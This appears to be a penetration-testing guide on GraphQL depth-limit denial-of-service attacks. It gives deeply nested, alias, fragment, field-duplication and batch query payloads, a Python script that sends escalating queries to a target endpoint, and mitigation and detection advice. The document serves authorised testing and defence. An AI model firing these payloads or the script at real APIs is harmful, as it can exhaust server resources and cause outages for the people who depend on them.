---
name: performing-graphql-depth-limit-attack
description: Execute and test GraphQL depth limit attacks using deeply nested recursive queries to identify denial-of-service vulnerabilities in GraphQL APIs.
domain: cybersecurity
subdomain: api-security
tags: [graphql, depth-limit, denial-of-service, nested-queries, api-security, query-complexity, resource-exhaustion, penetration-testing]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Performing GraphQL Depth Limit Attack

## Overview

GraphQL depth limit attacks exploit the recursive nature of GraphQL schemas to craft deeply nested queries that consume excessive server resources, leading to denial of service. Unlike REST APIs with fixed endpoints, GraphQL allows clients to request arbitrary data structures. When schemas contain circular relationships (e.g., User -> Posts -> Author -> Posts), attackers can create queries that recurse indefinitely, overwhelming the server's CPU, memory, database connections, and network bandwidth.

## Prerequisites

- Target GraphQL API endpoint with introspection enabled or known schema
- GraphQL client tools (GraphiQL, Altair, Insomnia, or curl)
- Python 3.8+ with requests library for automated testing
- Burp Suite or mitmproxy for traffic analysis
- Authorization to perform security testing on the target

## Core Attack Techniques

### 1. Recursive Depth Attack

When a GraphQL schema has bidirectional relationships, queries can reference them recursively:

```graphql
# Schema with circular reference:
# type User { posts: [Post] }
# type Post { author: User }

# Attack query with excessive nesting depth
query DepthAttack {
  users {
    posts {
      author {
        posts {
          author {
            posts {
              author {
                posts {
                  author {
                    posts {
                      author {
                        posts {
                          title
                          author {
                            name
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

### 2. Alias-Based Amplification

When batch queries are blocked, aliases can multiply the same field request within a single query:

```graphql
query AliasAmplification {
  a1: user(id: 1) { posts { author { name } } }
  a2: user(id: 1) { posts { author { name } } }
  a3: user(id: 1) { posts { author { name } } }
  a4: user(id: 1) { posts { author { name } } }
  a5: user(id: 1) { posts { author { name } } }
  a6: user(id: 1) { posts { author { name } } }
  a7: user(id: 1) { posts { author { name } } }
  a8: user(id: 1) { posts { author { name } } }
  a9: user(id: 1) { posts { author { name } } }
  a10: user(id: 1) { posts { author { name } } }
}
```

### 3. Fragment Spread Attack

Fragments can be used to construct complex, deeply nested queries more efficiently:

```graphql
fragment UserFields on User {
  name
  email
  posts {
    title
    comments {
      body
      author {
        ...NestedUser
      }
    }
  }
}

fragment NestedUser on User {
  name
  posts {
    title
    author {
      name
      posts {
        title
        author {
          name
        }
      }
    }
  }
}

query FragmentAttack {
  users {
    ...UserFields
  }
}
```

### 4. Field Duplication Attack

Repeating the same field multiple times within a selection set increases processing:

```graphql
query FieldDuplication {
  user(id: 1) {
    posts { title }
    posts { title }
    posts { title }
    posts { title }
    posts { title }
    posts { title }
    posts { title }
    posts { title }
    posts { title }
    posts { title }
  }
}
```

### 5. Batch Query Attack

Sending multiple queries in a single HTTP request:

```json
[
  {"query": "{ users { posts { author { name } } } }"},
  {"query": "{ users { posts { author { name } } } }"},
  {"query": "{ users { posts { author { name } } } }"},
  {"query": "{ users { posts { author { name } } } }"},
  {"query": "{ users { posts { author { name } } } }"}
]
```

## Automated Testing Script

```python
#!/usr/bin/env python3
"""GraphQL Depth Limit Attack Testing Tool

Tests GraphQL endpoints for depth limiting vulnerabilities
by sending progressively deeper nested queries.
"""

import requests
import time
import json
import sys
from typing import Optional

class GraphQLDepthTester:
    def __init__(self, endpoint: str, headers: Optional[dict] = None):
        self.endpoint = endpoint
        self.headers = headers or {"Content-Type": "application/json"}
        self.results = []

    def generate_nested_query(self, depth: int, field_a: str = "posts",
                               field_b: str = "author",
                               leaf_field: str = "name") -> str:
        """Generate a recursively nested GraphQL query to a specified depth."""
        query = "{ users { "
        for i in range(depth):
            if i % 2 == 0:
                query += f"{field_a} {{ "
            else:
                query += f"{field_b} {{ "
        query += leaf_field
        query += " }" * (depth + 1)  # Close all braces
        query += " }"
        return query

    def generate_alias_query(self, count: int, inner_query: str) -> str:
        """Generate a query with multiple aliases."""
        aliases = []
        for i in range(count):
            aliases.append(f"a{i}: {inner_query}")
        return "{ " + " ".join(aliases) + " }"

    def send_query(self, query: str, timeout: int = 30) -> dict:
        """Send a GraphQL query and measure response metrics."""
        payload = json.dumps({"query": query})
        start_time = time.time()
        try:
            response = requests.post(
                self.endpoint,
                data=payload,
                headers=self.headers,
                timeout=timeout
            )
            elapsed = time.time() - start_time
            return {
                "status_code": response.status_code,
                "response_time": round(elapsed, 3),
                "response_size": len(response.content),
                "has_errors": "errors" in response.json() if response.status_code == 200 else True,
                "error_message": self._extract_error(response),
                "success": response.status_code == 200 and "errors" not in response.json()
            }
        except requests.exceptions.Timeout:
            elapsed = time.time() - start_time
            return {
                "status_code": 0,
                "response_time": round(elapsed, 3),
                "response_size": 0,
                "has_errors": True,
                "error_message": "Request timed out",
                "success": False
            }
        except requests.exceptions.ConnectionError:
            return {
                "status_code": 0,
                "response_time": 0,
                "response_size": 0,
                "has_errors": True,
                "error_message": "Connection refused - possible DoS",
                "success": False
            }

    def _extract_error(self, response) -> str:
        try:
            data = response.json()
            if "errors" in data:
                return data["errors"][0].get("message", "Unknown error")
        except (json.JSONDecodeError, IndexError, KeyError):
            pass
        return ""

    def test_depth_limits(self, max_depth: int = 20):
        """Progressively test increasing query depths."""
        print(f"Testing depth limits from 1 to {max_depth}...")
        print(f"{'Depth':<8}{'Status':<10}{'Time(s)':<12}{'Size(B)':<12}{'Result'}")
        print("-" * 65)

        for depth in range(1, max_depth + 1):
            query = self.generate_nested_query(depth)
            result = self.send_query(query)
            result["depth"] = depth
            self.results.append(result)

            status = "OK" if result["success"] else "BLOCKED"
            print(f"{depth:<8}{result['status_code']:<10}{result['response_time']:<12}"
                  f"{result['response_size']:<12}{status}")

            if result["error_message"] and "depth" in result["error_message"].lower():
                print(f"\n[+] Depth limit detected at depth {depth}")
                print(f"    Error: {result['error_message']}")
                return depth

            if result["status_code"] == 0:
                print(f"\n[!] Server became unresponsive at depth {depth}")
                return depth

        print(f"\n[!] WARNING: No depth limit detected up to depth {max_depth}")
        return None

    def test_alias_amplification(self, alias_counts: list = None):
        """Test alias-based amplification attacks."""
        if alias_counts is None:
            alias_counts = [1, 5, 10, 25, 50, 100]

        print(f"\nTesting alias amplification...")
        inner = 'user(id: "1") { posts { title } }'

        for count in alias_counts:
            query = self.generate_alias_query(count, inner)
            result = self.send_query(query)
            status = "OK" if result["success"] else "BLOCKED"
            print(f"  Aliases: {count:<6} Status: {result['status_code']:<6} "
                  f"Time: {result['response_time']:<8}s  {status}")

    def generate_report(self) -> dict:
        """Generate a summary report of all tests."""
        successful = [r for r in self.results if r["success"]]
        blocked = [r for r in self.results if not r["success"]]
        max_successful_depth = max([r["depth"] for r in successful], default=0)

        return {
            "endpoint": self.endpoint,
            "total_tests": len(self.results),
            "successful_queries": len(successful),
            "blocked_queries": len(blocked),
            "max_successful_depth": max_successful_depth,
            "depth_limit_enforced": len(blocked) > 0,
            "vulnerability": "HIGH" if max_successful_depth > 10 else
                           "MEDIUM" if max_successful_depth > 5 else "LOW"
        }


if __name__ == "__main__":
    endpoint = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:4000/graphql"
    tester = GraphQLDepthTester(endpoint)
    tester.test_depth_limits(max_depth=15)
    tester.test_alias_amplification()

    report = tester.generate_report()
    print(f"\n{'='*50}")
    print(f"REPORT SUMMARY")
    print(f"{'='*50}")
    for key, value in report.items():
        print(f"  {key}: {value}")
```

## Mitigation Strategies

### Depth Limiting

```javascript
// Using graphql-depth-limit (Node.js)
const depthLimit = require('graphql-depth-limit');
const server = new ApolloServer({
  typeDefs,
  resolvers,
  validationRules: [depthLimit(5)]
});
```

### Query Complexity Analysis

```javascript
// Using graphql-query-complexity
const { createComplexityRule } = require('graphql-query-complexity');

const complexityRule = createComplexityRule({
  maximumComplexity: 1000,
  estimators: [
    fieldExtensionsEstimator(),
    simpleEstimator({ defaultComplexity: 1 })
  ],
  onComplete: (complexity) => {
    console.log('Query complexity:', complexity);
  }
});
```

### Rate Limiting and Timeout Controls

```python
# Server-side timeout configuration
GRAPHQL_CONFIG = {
    "max_depth": 5,
    "max_complexity": 1000,
    "max_aliases": 10,
    "query_timeout_seconds": 10,
    "max_batch_size": 5,
    "rate_limit_per_minute": 100
}
```

## Detection Indicators

- Unusually deep or complex GraphQL queries in server logs
- Spike in response times correlated with specific query patterns
- High memory or CPU usage on GraphQL server processes
- Repeated requests with incrementally increasing query complexity
- Large response payloads from single query requests

## References

- OWASP GraphQL Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
- Apollo GraphQL Security Guide: https://www.apollographql.com/blog/securing-your-graphql-api-from-malicious-queries
- Checkmarx GraphQL Depth Exploitation: https://checkmarx.com/blog/exploiting-graphql-query-depth/
- GraphQL.org Security: https://graphql.org/learn/security/
- Escape.tech Cyclic Queries: https://escape.tech/blog/cyclic-queries-and-depth-limit/
- PortSwigger GraphQL Vulnerabilities: https://portswigger.net/web-security/graphql
